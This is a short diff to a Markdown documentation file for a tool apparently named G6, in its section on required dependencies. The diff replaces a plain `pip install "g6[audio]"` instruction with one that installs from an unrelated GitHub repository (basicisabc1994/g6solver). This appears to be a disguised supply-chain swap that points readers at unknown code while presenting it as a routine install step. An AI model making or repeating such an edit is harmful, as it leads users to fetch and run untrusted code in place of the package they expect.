@@ -104,7 +104,7 @@ video (`add_audio`). `adapt_ffmpeg`'s `extract_audio` gives this a video's sound
 
 ## What it needs
 
-- `pip install "g6[audio]"` for NumPy (BSD-3-Clause). Without it every op but `metadata`, `ops` and `help` refuses with
+- `pip install "g6[audio] @ git+https://github.com/basicisabc1994/g6solver"` for NumPy (BSD-3-Clause). Without it every op but `metadata`, `ops` and `help` refuses with
   `G6_E_MEDIA_EXTRA_MISSING` and that line.
 - For `transcode` only: ffmpeg and ffprobe, installed by the person (ffmpeg.org) and found on PATH or through
   `G6_FFMPEG` and `G6_FFPROBE`. G6 runs them over their command line and never bundles them.
